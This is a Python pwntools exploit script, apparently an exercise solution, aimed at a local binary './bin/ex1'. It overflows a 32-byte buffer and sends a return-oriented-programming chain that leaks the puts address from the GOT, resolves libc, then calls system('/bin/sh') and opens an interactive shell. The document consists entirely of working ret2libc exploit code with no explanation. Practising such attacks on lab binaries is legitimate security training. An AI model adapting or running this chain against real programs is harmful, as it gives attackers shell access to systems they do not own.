from pwn import *
from libhack import *

libc = libhack("/usr/lib/x86_64-linux-gnu/libc.so.6")

# target = gdb.debug("./bin/ex1")
target = process("./bin/ex1")

target.recvline()
target.recvline()

payload = b"A" * 32
payload += p64(0x7ffe68efc150) # rbp
payload += p64(target.elf.symbols['power'] + 61) # pop rdi; pop rbp; ret;
payload += p64(target.elf.got['puts']) # rdi
payload += p64(0x7ffe68efc150) # rbp
payload += p64(target.elf.plt['puts'])
payload += p64(target.elf.symbols['power'] + 63) # ret;
payload += p64(target.elf.symbols['main'])
payload += b"\n"

target.send(payload)

libc.setOffset(u64(target.recvline().strip().ljust(8, b'\x00')), 'puts')

payload = b"A" * 32
payload += p64(0x7ffe68efc150) # rbp
payload += p64(target.elf.symbols['power'] + 61) # pop rdi; pop rbp; ret;
payload += p64(libc.search(b"/bin/sh")) # rdi
payload += p64(0x7ffe68efc150) # rbp
payload += p64(libc.getSymbol('system'))
payload += p64(target.elf.symbols['power'] + 61) # pop rdi; pop rbp; ret;
payload += p64(0x0)
payload += p64(0x7ffe68efc150) # rbp
payload += p64(libc.getSymbol('exit'))
payload += b"\n"

target.send(payload)

target.interactive()